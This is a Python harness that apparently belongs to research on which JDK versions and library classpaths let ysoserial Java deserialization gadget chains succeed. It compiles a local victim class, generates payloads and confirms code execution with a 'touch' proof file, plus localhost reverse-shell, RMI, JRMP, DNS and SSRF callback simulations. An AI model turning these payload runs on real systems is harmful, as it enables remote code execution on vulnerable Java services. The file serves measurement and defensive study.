import subprocess
import os
import re
import multiprocessing
import time
import socket
import random
from .results import *
from .payloads import Payload
from .util import simple_server, simplify_classpath

BASE_JDK_PATH = "home/jvm"
REMOTE_CLASS_SERVER_PORT = 1025

def cleanup(exploit_path):
    # get rid of eventual python script
    for file in os.listdir(exploit_path):
        file_path = os.path.join(exploit_path, file)
        if os.path.isfile(file_path):
            os.remove(file_path)
    try:
        os.remove(os.path.join(exploit_path, "main/Victim.class"))
    except:
        os.remove(os.path.join(exploit_path, "main/DnsVictim.class"))
    os.rmdir(exploit_path + "/main")
    os.rmdir(exploit_path)


def run_single_rce(jdk_path : str, classpath : str, payload : str, command : str, target_classpath:str="output/tmp", variables:str="", ysoserial_path:str="ysoserial-all.jar",target_class:str="src/main/Victim.java", 
                compilation_target:str="main.Victim",debug:bool=False):
    
    java = os.path.join(jdk_path, "bin/java")
    javac = os.path.join(jdk_path, "bin/javac")  
    #ysoserial_java = "/home/jvm/oracle/6/jdk1.6.0_41/bin/java"

    # since there are differences in the deserialization output based on the jvm used, but starting with jdk16 illegal reflective access errors get thrown
    # we want to choose the jdk version to be the same as the application for <=jdk15, and else only use the most recent jdk 
                    
    
                    
    if "oracle" in jdk_path:
        java_version = int(jdk_path.split("/")[4])
        if java_version <= 15:
            ysoserial_java = java
        else:
            ysoserial_java = "/home/jvm/oracle/15/jdk-15.0.2/bin/java" 
    elif "ibm" in jdk_path:
        if "jdk8" in jdk_path or "jdk-11" in jdk_path:
            ysoserial_java = java                 
        else:
             ysoserial_java = "/home/jvm/ibm/jdk-11.0.20.1+1/bin/java"      
        
    elif "openjdk" in jdk_path:
        java_version = int(jdk_path.split("/")[4])
        if java_version <= 15:
            ysoserial_java = java
        else:
            ysoserial_java = "/home/jvm/openjdk/15/jdk-15.0.2/bin/java"
    elif "adoptium" in jdk_path:
        java_version = int(jdk_path.split("/")[4])
        if java_version <= 15:
            ysoserial_java = java
        else:
            ysoserial_java = "/home/jvm/adoptium/11/jdk-11.0.21+9/bin/java"
        
    command_output = None if debug else subprocess.DEVNULL    
    os.makedirs(target_classpath, exist_ok=True)

    mock_dependencies = ""

    if classpath == "":
        if "urldns" in variables:
            mock_dependencies="data/libraries/burningwave/tools-0.25.12.jar:data/libraries/burningwave/core-12.62.7.jar:data/libraries/burningwave/jvm-driver-9.6.0.jar:data/libraries/burningwave/narcissus-1.0.7.jar"   
            subprocess.run([javac, "-cp", mock_dependencies, "-d", target_classpath, target_class], stdout=command_output, stderr= command_output) 
            subprocess.run(ysoserial_java + " -jar " + ysoserial_path + " " + payload + " '" + command + "' > " + target_classpath +"/file.ser" , shell=True, stdout=command_output, stderr= command_output)
            subprocess.run([java, "-cp", mock_dependencies + ":" + target_classpath, compilation_target, target_classpath + "/file.ser", variables.split(",")[1]], stdout=command_output, stderr= command_output)        
        else:
            subprocess.run([javac, "-d", target_classpath, target_class], stdout=command_output, stderr= command_output) 
            subprocess.run(ysoserial_java + " -jar " + ysoserial_path + " " + payload + " '" + command + "' > " + target_classpath +"/file.ser" , shell=True, stdout=command_output, stderr= command_output)
            subprocess.run([java, "-cp", mock_dependencies + ":" + target_classpath, compilation_target, target_classpath + "/file.ser"], stdout=command_output, stderr= command_output)        
    elif variables == "hibernate5":
        subprocess.run([javac, "-cp", classpath, "-d", target_classpath, target_class], stdout=command_output, stderr= command_output) 
        subprocess.run(ysoserial_java + " -Dhibernate5 " + " -cp " + classpath + " -jar " + ysoserial_path + " " + payload + " '" + command + "' > " + target_classpath + "/file.ser" , shell=True, stdout=command_output, stderr= command_output)
        subprocess.run([java, "-Dhibernate5", "-cp", classpath + ":" + target_classpath, compilation_target, target_classpath + "/file.ser"], stdout=command_output, stderr= command_output)
    elif variables == "lazylist":
        subprocess.run([javac, "-cp", classpath, "-d", target_classpath, target_class], stdout=command_output, stderr= command_output) 
        subprocess.run(ysoserial_java + " -cp " + classpath + " -jar cve-2022-36944.jar " + command + " > " + target_classpath + "/file.ser" , shell=True, stdout=command_output, stderr= command_output)
        subprocess.run([java, "-cp", classpath + ":" + target_classpath, compilation_target, target_classpath + "/file.ser"], stdout=command_output, stderr= command_output)

    else:
        subprocess.run([javac, "-cp", classpath, "-d", target_classpath, target_class], stdout=command_output, stderr= command_output) 
        subprocess.run(ysoserial_java + " -cp " + classpath + " -jar " + ysoserial_path + " " + payload + " '" + command + "' > " + target_classpath + "/file.ser" , shell=True, stdout=command_output, stderr= command_output)
        subprocess.run([java, "-cp", classpath + ":" + target_classpath, compilation_target, target_classpath + "/file.ser"], stdout=command_output, stderr= command_output)


def find_open_port():
    while(True):
        port = random.randrange(1026, 65535)
        with socket.socket() as sock:
            if sock.connect_ex(('localhost', port)) != 0:
                sock.close()
                return port

def prepare_rmi(port):    
    subprocess.run(["javac", "src/main/RemoteClass.java", "-d", "output"])
    proc = multiprocessing.Process(target=simple_server, args=("output/main", port))
    proc.start()
    
    return proc

def prepare_listener(port, filename, udp=False):
    if udp:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.bind(('localhost', port))
        while True:
            data, addr = s.recvfrom(1024)
            if data:
                f = open(filename, "w")
                f.close()
            
    else:
        s = socket.socket()
        s.bind(('localhost', port))

        s.listen(2)
        
        while True:
            c, addr = s.accept()      
            f = open(filename, "w")
            f.close()
            c.close()

def connect(port:int, filename):
    s = socket.socket()
    if s.connect_ex(("localhost", port)) == 0:
        f = open(filename, "w")
        f.close()

    s.close()
    return

def find_matching_in_list(list:list[str] , str:str):
    for item in list:
        if re.search(str, item):
            return item
        
    print("[ERROR] no match for " + str)
    return None

def validate_exploit(filename, classpath:str, jdk_path:str):
    if (os.path.exists(filename)):
        print("[INFO] Exploit success: " + jdk_path +  " -cp " + classpath)        
        return True
    else:
        #print("[INFO:NoExploit] " + jdk_path +  " -cp " + classpath)
        return False

def validate_exploit_fileupload(pathname, filename, classpath:str, jdk_path:str):

    for file in os.listdir(pathname):
        if "tmp" in file:
            print("[INFO] Exploit success: " + jdk_path +  " -cp " + classpath) 
            with open(filename, "w") as f:
                pass
            return True
    
    #print("[INFO:NoExploit] " + jdk_path +  " -cp " + classpath)
    return False



def validate_exploit_urldns(filename, classpath:str, jdk_path:str, proc:multiprocessing.Process):
    
    proc.terminate()
    # needs to give a little time before buffered output is read into file
    time.sleep(2)

    if os.path.exists(filename):
        if os.stat(filename).st_size > 0:        
            print("[INFO] Exploit success: " + jdk_path +  " -cp " + classpath) 
    
            return True
        os.p
    
    #print("[INFO:NoExploit] " + jdk_path +  " -cp " + classpath)    
    return False

def run_optimal(payload:Payload, jdk_path:str, debug:bool=False):
    if not isinstance(payload, Payload):
        raise Exception("object is not of type payload")    

    lib_path = "data/libraries/"
    classpath = "" 

    for i in range(0, len(payload.dependencies)):
        library = payload.dependencies[i]                

        for f in os.listdir(lib_path + library):
            if re.search(payload.fixpoints[i], f):
                classpath += os.path.join(lib_path, library, f)             
                break
        
        if i < len(payload.dependencies) - 1:
            classpath += ":"
        
    run_single_rce(jdk_path, classpath, payload.name, "touch proof.txt", debug=debug)
    if (os.path.exists("proof.txt")):
        print("[INFO] success for cp: " + classpath)
        os.remove("proof.txt")
    else:
        print("[INFO] no rce for cp: " + classpath)        

def run_payload_group(payload:Payload, jdk_path:str):

    if not isinstance(payload, Payload):
        raise Exception("object is not of type payload")    

    jdk_split = jdk_path.split("/")

    vendor = jdk_split[len(jdk_split) - 2] 
    simplified_jdk_path = jdk_split[len(jdk_split) - 1] 
    # Step to distinguish different jdk vendors in results
    if vendor == "ibm" : simplified_jdk_path = "ibm-" + simplified_jdk_path
    if "adoptium" in jdk_path : simplified_jdk_path = "temurin-" + simplified_jdk_path
    if "openjdk" in jdk_path : simplified_jdk_path = "openjdk-" + simplified_jdk_path

    jdk_entry = JDK_Entry(simplified_jdk_path, payload.dependencies)    

    lib_path = "data/libraries/"
    dependency_lists = [] 

    for i in range(0, len(payload.dependencies)):
        library = payload.dependencies[i] 
        dependency_lists.append([]) 

        for f in os.listdir(lib_path + library):
            dependency_lists[i].append(os.path.join(lib_path, library, f)) 
        
    

    # this makes the following logic also run for exploits without dependencies 
    if len(payload.dependencies) == 0:
        dependency_lists.append([""])

    # Construction of the depencies used in test classpath
    # For certain cases like json1 too many possibilities exist (25x255x1x10x31x11x22x255x22), so only one library is changed at a time and the remainder is using a library proven
    # to work (according to ysoserial repo)
    # this results in sum(dependencies) instead of product(dependencies) runs

    for i in range(0, len(dependency_lists)):
        for j in range(0, len(dependency_lists[i])):

            classpath = ""  
            is_exploit_success = False

            for k in range(0, len(dependency_lists)):
                if k == i:
                    classpath += dependency_lists[i][j]                    
                else:
                    classpath +=  find_matching_in_list(dependency_lists[k], payload.fixpoints[k]) 

                if k < len(dependency_lists) - 1:
                    classpath += ":"

            simplified_classpath = simplify_classpath(classpath)

            # for parallelisation
            proof_file_name = os.path.join("output", payload.name + "_" + simplified_jdk_path + "_" + simplified_classpath).replace(":", "#")

            if payload.type == "rce":    

                if "hibernate-core-5" in classpath or "hibernate-core-6" in classpath:
                    run_single_rce(jdk_path, classpath, payload.name, f"touch {proof_file_name}", proof_file_name + "_d", variables="hibernate5", ysoserial_path="hibernate5-ysoserial-all.jar")
                else:
                    run_single_rce(jdk_path, classpath, payload.name, f"touch {proof_file_name}", proof_file_name + "_d")
                
                is_exploit_success = validate_exploit(proof_file_name, simplified_classpath, simplified_jdk_path)            

            # C3P0
            elif payload.type == "remote-class":
                # code lines below also work but for simplicity one can proceed analogous to JRMPClient
                #run_single_rce(jdk_path, classpath, payload.name, f"http://127.0.0.1:{REMOTE_CLASS_SERVER_PORT}/:main.RemoteClass", proof_file_name + "_d")
                #is_exploit_success = validate_exploit(proof_file_name, simplified_classpath, simplified_jdk_path)

                port = find_open_port()
                    
                # reverse shell simulation using a socket connection and delays to establish
                listener_proc = multiprocessing.Process(target=prepare_listener, args=(port, proof_file_name))
                bind_proc = multiprocessing.Process(target=run_single_rce, args=(jdk_path, classpath, payload.name, f"http://127.0.0.1:{port}/:main.RemoteClass", proof_file_name + "_d"))
                listener_proc.start()                    
                time.sleep(1)
                    
                bind_proc.start()
                time.sleep(1)                   
                listener_proc.kill()
                bind_proc.kill()
                time.sleep(0.5)
                is_exploit_success = validate_exploit(proof_file_name, simplified_classpath, simplified_jdk_path)

                               

            # Jython
            elif payload.type == "python-script-execution":
                os.makedirs(f"{proof_file_name}_d", exist_ok=True)

                with open(f"{proof_file_name}_d/jython_in.py", "w") as script_file:
                    script_file.write(f'import os\nos.system("touch {proof_file_name}")')

                run_single_rce(jdk_path, classpath, payload.name, f"{proof_file_name}_d/jython_in.py;{proof_file_name}_d/jython_out.py", proof_file_name + "_d")
                is_exploit_success = validate_exploit(proof_file_name, simplified_classpath, simplified_jdk_path)                

            # CVE-2022 lazylist
            elif payload.type == "lazylist":
                os.makedirs(f"{proof_file_name}_d", exist_ok=True)
                with open(f"{proof_file_name}_d/testfile", "w") as truncate_file:
                    truncate_file.write("lorem ipsum dolor ...")

                run_single_rce(jdk_path, classpath, payload.name, f"{proof_file_name}_d/testfile false", proof_file_name + "_d", variables="lazylist")
                if os.stat(f"{proof_file_name}_d/testfile").st_size == 0:
                    open(proof_file_name, "w").close()
                    print("y")
                is_exploit_success = validate_exploit(proof_file_name, simplified_classpath, simplified_jdk_path)               

            # aspect-jweaver
            elif payload.type == "file-write":
                run_single_rce(jdk_path, classpath, payload.name, f"{proof_file_name};cHJvb2Y=", proof_file_name + "_d")
                is_exploit_success = validate_exploit(proof_file_name, simplified_classpath, simplified_jdk_path)
                if is_exploit_success and os.path.exists("cache.idx"):
                    os.remove("cache.idx")

            elif payload.type == "zero-file":
                run_single_rce(jdk_path, classpath, payload.name, f"{proof_file_name}", proof_file_name + "_d")
                is_exploit_success = validate_exploit(proof_file_name, simplified_classpath, simplified_jdk_path)

            # FileUpload1 + Wicket1
            elif payload.type == "file-upload":
                run_single_rce(jdk_path, classpath, payload.name, f"write;{proof_file_name}_d;proof", proof_file_name + "_d")
                time.sleep(0.5)
                is_exploit_success = validate_exploit_fileupload(f"{proof_file_name}_d", proof_file_name, simplified_classpath, simplified_jdk_path)

            # urldns
            elif payload.type == "dns-lookup": 
                port = find_open_port()
                listener_proc = multiprocessing.Process(target=prepare_listener, args=(port, proof_file_name, True))
                proc = multiprocessing.Process(target=run_single_rce, args=(jdk_path, classpath, payload.name, f"http://{proof_file_name}.com", proof_file_name + "_d", f"urldns,{port}", "ysoserial-all.jar", "src/main/DnsVictim.java", "main.DnsVictim"))
                listener_proc.start()
                time.sleep(1)
                proc.start()
                time.sleep(3)
                proc.kill()     
                listener_proc.kill()
                time.sleep(1)
                is_exploit_success = validate_exploit(proof_file_name, simplified_classpath, simplified_jdk_path)                

            # Hibernate2
            elif payload.type == "rmi":
                port = find_open_port()
                    
                # reverse shell simulation using a socket connection and delays to establish
                listener_proc = multiprocessing.Process(target=prepare_listener, args=(port, proof_file_name))
                if "hibernate-core-5" in classpath or "hibernate-core-6" in classpath:
                    bind_proc = multiprocessing.Process(target=run_single_rce, args=(jdk_path, classpath, payload.name, f"rmi://localhost:{port}/service", proof_file_name + "_d", "hibernate5", "hibernate5-ysoserial-all.jar"))
                else:
                    bind_proc = multiprocessing.Process(target=run_single_rce, args=(jdk_path, classpath, payload.name, f"rmi://localhost:{port}/service", proof_file_name + "_d"))
                
                listener_proc.start()                    
                time.sleep(1)
                    
                bind_proc.start()
                time.sleep(2)                   
                listener_proc.kill()
                bind_proc.kill()
                time.sleep(0.5)
                is_exploit_success = validate_exploit(proof_file_name, simplified_classpath, simplified_jdk_path)

            # SSRF
            elif payload.type == "web-request":
                port = find_open_port()
                    
                # here we use a http server on another terminal, since otherwise considering all scala versions it would take too long
                run_single_rce(jdk_path, classpath, payload.name, f"http://localhost:1025/{proof_file_name}", proof_file_name + "_d")            

            # JRMPClient
            elif payload.type == "jrmp-client":

                port = find_open_port()
                    
                # reverse shell simulation using a socket connection and delays to establish
                listener_proc = multiprocessing.Process(target=prepare_listener, args=(port, proof_file_name))
                bind_proc = multiprocessing.Process(target=run_single_rce, args=(jdk_path, classpath, payload.name, f"localhost:{port}", proof_file_name + "_d"))
                listener_proc.start()                    
                time.sleep(1)
                    
                bind_proc.start()
                time.sleep(1)                   
                listener_proc.kill()
                bind_proc.kill()
                time.sleep(0.5)
                is_exploit_success = validate_exploit(proof_file_name, simplified_classpath, simplified_jdk_path)

            # JRMPListener
            elif payload.type == "jrmp-listener":
                port = find_open_port()

                listener_proc = multiprocessing.Process(target=run_single_rce, args=(jdk_path, classpath, payload.name, f"{port}", proof_file_name + "_d"))                    
                listener_proc.start()

                time.sleep(2)
                connect(port, proof_file_name)
                listener_proc.terminate()
                time.sleep(0.5)

                is_exploit_success = validate_exploit(proof_file_name, simplified_classpath, simplified_jdk_path)


            else:
                raise Exception("Payload type "+ payload.type + " not implemented")      

            cleanup(proof_file_name + "_d")     
                     
        
    return

def run_payload_group_all(payload:Payload, parallel_constraint=None):

    jdk_base_path = "/home/jvm"

    execution_filter_vendor = ["oracle", "apache", "ibm", "adoptium", "openjdk"]
    execution_filter_version = [*range(6,22)]   

    if parallel_constraint:
        p = parallel_constraint.split(":")
        execution_filter_vendor = [p[0]] 
        execution_filter_version = p[1].split(",")  

    for vendor in execution_filter_vendor: 

        if vendor == "oracle" or vendor == "adoptium" or vendor == "openjdk":

            for i in execution_filter_version:
                
                jdk_path = os.path.join(jdk_base_path, vendor, str(i))

                for f in os.listdir(jdk_path):
                    full_path = os.path.join(jdk_path, f)

                    if os.path.isfile(full_path):
                        continue
            
                    run_payload_group(payload, full_path)
                    

        elif vendor == "apache" or vendor == "ibm":
            for f in os.listdir(os.path.join(jdk_base_path, vendor)):
                full_path = os.path.join(jdk_base_path, vendor, f)
                if os.path.isfile(full_path):
                    continue

                run_payload_group(payload, full_path)

    # so if there were errors causing the group to crash, we can rerun later on
    with open(f"output/{parallel_constraint}_{payload.name}_done", "w") as f:
        pass

    
    return
